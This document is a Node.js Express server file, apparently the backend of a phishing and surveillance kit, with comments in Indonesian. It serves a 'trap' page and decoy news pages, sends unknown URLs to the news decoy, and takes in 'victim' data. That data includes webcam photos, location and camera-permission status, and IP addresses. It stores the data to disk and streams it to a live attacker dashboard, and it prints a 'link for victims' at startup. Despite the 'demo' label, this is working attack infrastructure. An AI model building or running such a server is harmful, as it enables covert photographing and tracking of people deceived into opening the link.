// server.js - VERSI YANG SUDAH DIPERBAIKI
const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const path = require("path");
const fs = require("fs");
const bodyParser = require("body-parser");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"],
  },
});

// Middleware untuk CORS - TARUH PALING ATAS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept, Authorization",
  );
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");

  // Handle preflight requests
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  next();
});

// Middleware untuk body parser
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// Buat folder captures jika belum ada
if (!fs.existsSync("captures")) {
  fs.mkdirSync("captures");
}

// Database sederhana
let victims = [];
let photos = {};

// ============= API ROUTES (TARUH PALING ATAS) =============

// Endpoint untuk testing
app.get("/api/test", (req, res) => {
  res.json({ status: "ok", message: "Server is running" });
});

// API untuk menerima data
app.post("/api/capture", (req, res) => {
  console.log("📥 Data received:", req.body);

  try {
    const data = req.body;

    // Validasi data
    if (!data || !data.victimId) {
      return res.status(400).json({ error: "Invalid data" });
    }

    // Tambahkan timestamp dan IP
    data.timestamp = new Date().toISOString();
    data.ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

    // Cari victim yang sudah ada
    const existingIndex = victims.findIndex(
      (v) => v.victimId === data.victimId,
    );

    if (existingIndex >= 0) {
      // Merge data
      if (!victims[existingIndex].data) {
        victims[existingIndex].data = {};
      }

      // Jika data memiliki struktur dengan type
      if (data.type && data.data) {
        victims[existingIndex].data[data.type] = data.data;
      } else if (data.data) {
        victims[existingIndex].data = {
          ...victims[existingIndex].data,
          ...data.data,
        };
      }

      victims[existingIndex].timestamp = data.timestamp;
      victims[existingIndex].ip = data.ip;
    } else {
      // Victim baru - buat struktur yang benar
      const newVictim = {
        victimId: data.victimId,
        timestamp: data.timestamp,
        ip: data.ip,
        data: {},
      };

      if (data.type && data.data) {
        newVictim.data[data.type] = data.data;
      } else if (data.data) {
        newVictim.data = data.data;
      }

      victims.push(newVictim);
    }

    // Kirim ke semua dashboard via socket
    io.emit("new-victim", data);

    // Simpan ke file log
    const logData = JSON.stringify(data) + "\n";
    fs.appendFileSync("victims.log", logData);

    console.log(`✅ Data saved for victim: ${data.victimId}`);

    res.json({ status: "ok", message: "Data captured" });
  } catch (error) {
    console.error("❌ Error:", error);
    res.status(500).json({ error: error.message });
  }
});

// API untuk menerima gambar
app.post("/api/capture-image", (req, res) => {
  console.log("📸 Received image upload request");

  try {
    const { image, victimId } = req.body;

    if (!image || !victimId) {
      console.log("❌ Missing image or victimId");
      return res.status(400).json({ error: "Invalid data" });
    }

    // Log ukuran gambar
    console.log(`📸 Image from ${victimId}, size: ${image.length} characters`);

    // Hapus header base64
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");

    // Simpan ke file
    const filename = `captures/${victimId}_${Date.now()}.jpg`;
    fs.writeFileSync(filename, base64Data, "base64");
    console.log(`✅ Image saved to ${filename}`);

    // Simpan di memory untuk ditampilkan
    photos[victimId] = image;

    // Kirim ke dashboard
    io.emit("new-photo", { victimId, image });
    console.log(`📤 Photo sent to dashboard for ${victimId}`);

    res.json({ status: "ok", filename });
  } catch (error) {
    console.error("❌ Error saving image:", error);
    res.status(500).json({ error: error.message });
  }
});

// ============= STATIC FILES =============
// Serve static files dari folder public
app.use(
  express.static("public", {
    setHeaders: (res, path) => {
      if (path.endsWith(".html")) {
        res.setHeader("Cache-Control", "no-cache");
      }
    },
  }),
);

// ============= PAGE ROUTES =============
// Serve halaman utama
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "dashboard.html"));
});

// Serve halaman trap
app.get("/demo", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "trap.html"));
});

// Serve halaman berita
app.get("/berita", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// Variasi URL berita
app.get("/artikel", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/news", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

app.get("/berita-terkini", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "berita.html"));
});

// ============= 404 HANDLER (TARUH PALING BAWAH) =============
// Handle semua request yang tidak ditemukan (404) redirect ke berita
app.use((req, res) => {
  // Jangan redirect untuk API routes
  if (req.path.startsWith("/api/")) {
    return res.status(404).json({ error: "API endpoint not found" });
  }

  // Jangan redirect untuk file statis
  if (req.path.includes(".")) {
    return res.status(404).send("File not found");
  }

  // Redirect halaman yang tidak dikenal ke berita
  res.redirect("/berita");
});

// Socket.io connection
io.on("connection", (socket) => {
  console.log("📊 Dashboard terhubung");

  // Kirim statistik
  socket.emit("stats", {
    total: victims.length,
    camera: victims.filter((v) => v.data?.camera_access?.status === "granted")
      .length,
    location: victims.filter((v) => v.data?.location?.status === "granted")
      .length,
  });

  // Kirim data yang sudah ada
  socket.emit("init-data", victims);

  // Kirim photos yang sudah ada
  Object.keys(photos).forEach((victimId) => {
    socket.emit("new-photo", { victimId, image: photos[victimId] });
  });
});

const PORT = 3000;
server.listen(PORT, "0.0.0.0", () => {
  console.log("\n🚀 Demo server running di:");
  console.log(`   - Local: http://localhost:${PORT}`);
  console.log(`   - Network: http://${getLocalIP()}:${PORT}`);
  console.log(`📤 Link untuk korban: http://localhost:${PORT}/demo`);
  console.log(`📊 Link dashboard: http://localhost:${PORT}`);
  console.log(`📰 Link berita: http://localhost:${PORT}/berita\n`);
});

// Helper untuk mendapatkan IP lokal
function getLocalIP() {
  const { networkInterfaces } = require("os");
  const nets = networkInterfaces();

  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}
